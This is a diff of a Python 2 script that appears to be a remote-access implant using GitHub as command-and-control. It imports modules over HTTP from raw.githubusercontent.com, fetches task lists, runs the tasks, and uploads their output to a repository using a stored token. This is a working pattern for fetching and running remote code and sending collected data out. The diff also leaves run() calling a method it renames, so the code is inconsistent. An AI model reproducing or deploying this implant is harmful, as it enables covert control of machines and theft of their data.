@@ -1,24 +1,37 @@
 #!/usr/bin/env python
 import sys
-print sys.path
 import json
 import time
 import base64
 import random
 import Queue
 import threading
-from github3 import login
-from httpimp import add_remote_repo, remove_remote_repo
-try:
-    from urllib2 import urlopen
-except ImportError:
-    from urllib.request import urlopen
+# from github3 import login
+# try:
+#     from urllib2 import urlopen
+# except ImportError:
+#     from urllib.request import urlopen
 import logging
 log_FORMAT = "%(message)s"
 logging.basicConfig(format=log_FORMAT)
 logger = logging.getLogger(__name__)
 # logger.setLevel(logging.WARN)
 logger.setLevel(logging.DEBUG)
+
+from httpimp import add_remote_repo, remove_remote_repo
+add_remote_repo(
+    ['toy'],
+    'https://raw.githubusercontent.com/how2how/toy/master')
+add_remote_repo(
+    ['nacl'],
+    'https://raw.githubusercontent.com/how2how/toy/master/toy/external')
+add_remote_repo(
+    ['covertutils'],
+    'https://raw.githubusercontent.com/how2how/toy/master/toy/external')
+from toy.modules import gh
+print sys.path
+for i in sys.modules:
+    print i
 
 
 class Boy(object):
@@ -27,39 +40,40 @@ class Boy(object):
                   'config/')
 
     def __init__(self, config):
-        guser = config.pop('gu', '')
-        gpass = config.pop('gp', '')
-        grepo = config.pop('gr', '')
+        self.guser = config.pop('gu', '')
+        # gpass = config.pop('gp', '')
+        self.gtoken = config.pop('to', '')
+        self.grepo = config.pop('gr', '')
         self.base_modules = config.pop('bm', {})
         self.task_url = config.pop('tu', self.config_url)
         self.run_modules = config.pop('rm', [])
         self.cf = int(config.pop('cf', 60))
         self.task_queue = Queue.Queue()
         self.result_path = 'data/%s/' % self._id
-        self.gh, self.repo, self.branch = Boy.connect(guser, gpass, grepo)
-        for g in (guser, gpass, grepo):
-            del g
+        # self.gh, self.repo, self.branch = Boy.connect(guser, gpass, grepo)
+        # for g in (guser, gpass, grepo):
+        #     del g
 
-    @staticmethod
-    def connect(u, p, r, b='master'):
-        gh = login(username=u, password=p)
-        repo = gh.repository(u, r)
-        branch = repo.branch(b)
-        return gh, repo, branch
+    # @staticmethod
+    # def connect(u, p, r, b='master'):
+    #     gh = login(username=u, password=p)
+    #     repo = gh.repository(u, r)
+    #     branch = repo.branch(b)
+    #     return gh, repo, branch
 
-    @staticmethod
-    def save_result(repo, path, data, msg='new result'):
-        # remote_path = path + '%d.data' % random.randint(1000, 100000)
-        repo.create_file(path, msg, base64.b64encode(data))
-        return
+    # @staticmethod
+    # def save_result(repo, path, data, msg='new result'):
+    #     # remote_path = path + '%d.data' % random.randint(1000, 100000)
+    #     repo.create_file(path, msg, base64.b64encode(data))
+    #     return
 
-    @staticmethod
-    def get_file(url):
-        try:
-            data = urlopen(url).read()
-        except Exception:
-            data = None
-        return data
+    # @staticmethod
+    # def get_file(url):
+    #     try:
+    #         data = urlopen(url).read()
+    #     except Exception:
+    #         data = None
+    #     return data
 
     def load(module, url):
         add_remote_repo([module], url)
@@ -94,7 +108,7 @@ class Boy(object):
 
     @staticmethod
     def get_config(config_url):
-        config = Boy.get_file(config_url)
+        config = gh.get_raw(config_url)
         if config:
             config = json.loads(config)
         else:
@@ -102,8 +116,8 @@ class Boy(object):
         return config
 
     @staticmethod
-    def get_task(task_url):
-        tasks = Boy.get_file(task_url)
+    def load_task(task_url):
+        tasks = gh.get_raw(task_url)
         if tasks:
             tasks = json.loads(tasks)
             for task in tasks:
@@ -126,14 +140,13 @@ class Boy(object):
         self.task_queue.put(1)
         result = sys.modules[m].run()
         self.task_queue.get()
-        self.save_result(self.repo, path, result)
+        gh.put(self.guser, self.gtoken, self.grepo, path, result)
         if not loop:
             del sys.modules[m]
         return
 
     def run(self):
         self.install()
-        print ''
         while True:
             if self.task_queue.empty():
                 tasks = self.get_task(self.task_url + self._id + '.json')
